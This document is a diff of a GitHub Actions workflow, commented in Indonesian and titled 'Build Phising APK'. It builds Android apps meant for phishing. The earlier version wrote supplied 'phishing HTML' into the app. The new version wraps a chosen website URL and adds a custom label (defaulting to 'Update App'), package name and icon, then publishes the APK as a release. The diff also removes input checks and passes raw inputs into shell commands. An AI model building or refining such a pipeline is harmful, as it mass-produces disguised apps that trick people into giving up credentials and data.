@@ -1,19 +1,18 @@
-name: Build Phishing APK
+name: Build Phising APK
 
 on:
   workflow_dispatch:
     inputs:
       app_name:
-        description: 'Nama aplikasi (label APK)'
+        description: 'Nama aplikasi (label APK & nama file)'
         required: true
-        default: 'NeXsus Infinity'
-      html_content:
-        description: 'Isi HTML phishing'
+        default: 'Update App'
+      website_url:
+        description: 'URL Website yang mau dijadikan APK'
         required: true
       icon_url:
-        description: 'URL icon (dari catbox/imgbb)'
-        required: false
-        default: ''
+        description: 'URL icon'
+        required: true
       uid:
         description: 'UID akun'
         required: true
@@ -55,7 +54,7 @@ jobs:
           restore-keys: |
             ${{ runner.os }}-gradle-
 
-      # ─── Override app label (AMAN, GAK HAPUS STRING LAIN) ───
+      # ─── Override app label ───
       - name: Override app label
         shell: bash
         run: |
@@ -79,7 +78,6 @@ jobs:
           fi
           
           echo "✅ App label set to: $APP_NAME"
-          cat "$STRINGS_FILE"
 
       # ─── Override package name ───
       - name: Override package name
@@ -119,12 +117,10 @@ jobs:
           if [ -f app/build.gradle.kts ]; then
             sed -i "s/namespace = \"$OLD_PKG\"/namespace = \"$NEW_PKG\"/g" app/build.gradle.kts
             sed -i "s/applicationId = \"$OLD_PKG\"/applicationId = \"$NEW_PKG\"/g" app/build.gradle.kts
-            echo "✅ build.gradle.kts updated"
           fi
           if [ -f app/build.gradle ]; then
             sed -i "s/namespace \"$OLD_PKG\"/namespace \"$NEW_PKG\"/g" app/build.gradle
             sed -i "s/applicationId \"$OLD_PKG\"/applicationId \"$NEW_PKG\"/g" app/build.gradle
-            echo "✅ build.gradle updated"
           fi
 
           OLD_PATH="app/src/main/java/$(echo $OLD_PKG | tr '.' '/')"
@@ -132,40 +128,16 @@ jobs:
           if [ -d "$OLD_PATH" ]; then
             mkdir -p "$(dirname "$NEW_PATH")"
             mv "$OLD_PATH" "$NEW_PATH"
-            echo "✅ Source folder moved: $OLD_PATH → $NEW_PATH"
-          else
-            echo "⚠️ Folder source tidak ditemukan di $OLD_PATH"
           fi
-
-          find app/src -type f \( -name "*.kt" -o -name "*.java" \) -exec \
-            sed -i "s/\b$OLD_PKG\b/$NEW_PKG/g" {} +
-
+          find app/src -type f \( -name "*.kt" -o -name "*.java" \) -exec sed -i "s/\b$OLD_PKG\b/$NEW_PKG/g" {} +
           MANIFEST="app/src/main/AndroidManifest.xml"
           if [ -f "$MANIFEST" ]; then
             if grep -q 'package="' "$MANIFEST"; then
               sed -i "s/package=\"$OLD_PKG\"/package=\"$NEW_PKG\"/g" "$MANIFEST"
-              echo "✅ Manifest package attribute updated"
-            else
-              echo "ℹ️ Manifest tidak punya package attribute (normal di AGP modern)"
             fi
             sed -i "s/\b$OLD_PKG\b/$NEW_PKG/g" "$MANIFEST"
           fi
-
-          find app/src/main/res -type f -name "*.xml" -exec \
-            sed -i "s/\b$OLD_PKG\b/$NEW_PKG/g" {} + 2>/dev/null || true
-
-          echo "🔍 Verifying package replacement..."
-          if [ -f app/build.gradle.kts ]; then
-            grep -E "namespace|applicationId" app/build.gradle.kts | grep "$NEW_PKG" && echo "✅ namespace/applicationId verified" || echo "❌ MISMATCH in gradle.kts!"
-          fi
-          if [ -f app/build.gradle ]; then
-            grep -E "namespace|applicationId" app/build.gradle | grep "$NEW_PKG" && echo "✅ namespace/applicationId verified" || echo "❌ MISMATCH in gradle!"
-          fi
-          if [ -d "$NEW_PATH" ]; then
-            echo "✅ New source folder exists: $NEW_PATH"
-          else
-            echo "⚠️ New source folder tidak ada, tapi mungkin project pakai struktur lain"
-          fi
+          find app/src/main/res -type f -name "*.xml" -exec sed -i "s/\b$OLD_PKG\b/$NEW_PKG/g" {} + 2>/dev/null || true
 
       # ─── Set icon from URL ───
       - name: Set icon from URL
@@ -173,39 +145,14 @@ jobs:
         run: |
           cd android
           ICON_URL="${{ github.event.inputs.icon_url }}"
-          if [ -z "$ICON_URL" ]; then
-            echo "ℹ️ No icon provided, using default."
-            exit 0
-          fi
-
-          if [[ "$ICON_URL" == *"xxxxx"* ]]; then
-            echo "❌ ERROR: URL icon masih link contoh (placeholder)!"
-            exit 1
-          fi
+          if [ -z "$ICON_URL" ]; then exit 0; fi
 
           sudo apt-get update -qq
           sudo apt-get install -y -qq imagemagick wget file
-
-          echo "⬇️ Downloading icon from: $ICON_URL"
+          
           wget -q -O /tmp/custom_icon_raw "$ICON_URL" || curl -sL -A "Mozilla/5.0" "$ICON_URL" -o /tmp/custom_icon_raw
-
-          if [ ! -s /tmp/custom_icon_raw ]; then
-            echo "❌ Gagal download icon dari URL"
-            exit 1
-          fi
-
-          FILE_TYPE=$(file -b --mime-type /tmp/custom_icon_raw)
-          echo "File type detected: $FILE_TYPE"
-
-          if [[ "$FILE_TYPE" != image/* ]]; then
-            echo "❌ ERROR: URL bukan gambar (Downloaded: $FILE_TYPE)"
-            echo "💡 Pastikan link langsung mengarah ke file gambar (berakhiran .jpg/.png), bukan halaman web."
-            exit 1
-          fi
-
-          echo "🖼️ Converting to PNG..."
           convert /tmp/custom_icon_raw /tmp/custom_icon.png
-
+          
           for d in mdpi hdpi xhdpi xxhdpi xxxhdpi; do
             DIR="app/src/main/res/mipmap-$d"
             mkdir -p "$DIR"
@@ -221,16 +168,17 @@ jobs:
           done
           echo "✅ Icons replaced"
 
-      # ─── Inject HTML phishing ───
-      - name: Inject HTML content
+      # ─── 🔥 INJECT WEBSITE URL (BUKAN HTML) ───
+      - name: Inject Website URL
         shell: bash
-        env:
-          HTML_CONTENT: ${{ github.event.inputs.html_content }}
         run: |
           cd android
           mkdir -p app/src/main/assets
-          printf '%s' "$HTML_CONTENT" > app/src/main/assets/index.html
-          echo "✅ index.html written ($(wc -c < app/src/main/assets/index.html) bytes)"
+          
+          # Simpan URL ke dalam file JSON untuk dibaca oleh MainActivity.kt
+          echo "{\"url\":\"${{ github.event.inputs.website_url }}\"}" > app/src/main/assets/website.json
+          
+          echo "✅ URL berhasil di-inject: ${{ github.event.inputs.website_url }}"
 
       # ─── Inject UID ───
       - name: Inject UID
@@ -273,7 +221,7 @@ jobs:
             ./gradlew assembleRelease --stacktrace
           fi
 
-      # ─── Rename & locate APK ───
+      # ─── Rename APK Sesuai Nama Aplikasi ───
       - name: Rename APK
         shell: bash
         run: |
@@ -282,9 +230,17 @@ jobs:
             echo "❌ APK tidak ditemukan!"
             exit 1
           fi
-          cp "$APK_PATH" ./Apkphising.apk
-          ls -lh Apkphising.apk
-          echo "✅ APK siap: $(du -h Apkphising.apk | cut -f1)"
+          
+          # Ambil nama app dari input, ganti spasi dengan underscore
+          APP_NAME="${{ github.event.inputs.app_name }}"
+          SAFE_NAME=$(echo "$APP_NAME" | tr ' ' '_')
+          FINAL_APK_NAME="${SAFE_NAME}.apk"
+          
+          cp "$APK_PATH" "./$FINAL_APK_NAME"
+          echo "✅ APK siap: $FINAL_APK_NAME ($(du -h $FINAL_APK_NAME | cut -f1))"
+          
+          # Simpan nama file ke environment variable untuk step selanjutnya
+          echo "FINAL_APK_NAME=$FINAL_APK_NAME" >> $GITHUB_ENV
 
       # ─── Upload ke Release ───
       - name: Create Release & Upload APK
@@ -294,10 +250,10 @@ jobs:
           name: "Build ${{ github.run_number }} — ${{ github.event.inputs.app_name }}"
           body: |
             **App Name:** ${{ github.event.inputs.app_name }}
-            **Package:** ${{ github.event.inputs.package_name }}
+            **Website:** ${{ github.event.inputs.website_url }}
             **UID:** ${{ github.event.inputs.uid }}
             **Run:** #${{ github.run_number }}
-          files: Apkphising.apk
+          files: ${{ env.FINAL_APK_NAME }}
           draft: false
           prerelease: false
         env:
@@ -307,6 +263,6 @@ jobs:
       - name: Upload artifact
         uses: actions/upload-artifact@v4
         with:
-          name: SyncXxX-apk
-          path: SyncXxX.apk
+          name: Phising-APK-Build-${{ github.run_number }}
+          path: ${{ env.FINAL_APK_NAME }}
           retention-days: 30
